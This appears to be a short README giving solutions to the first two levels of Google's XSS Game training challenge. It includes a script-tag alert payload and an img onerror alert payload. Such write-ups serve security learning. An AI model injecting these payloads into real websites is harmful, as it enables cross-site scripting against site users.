# XSS Game Google
Solution to the six XSS issues proposed by Google

## [1/6]  Level 1: Hello, world of XSS
_Solution_: put `<script>alert('xss');</script>` into form field

## [2/6]  Level 2: Persistence is key
_Solution_: share status `<img src="#" onerror="javascript:alert(1)"/>`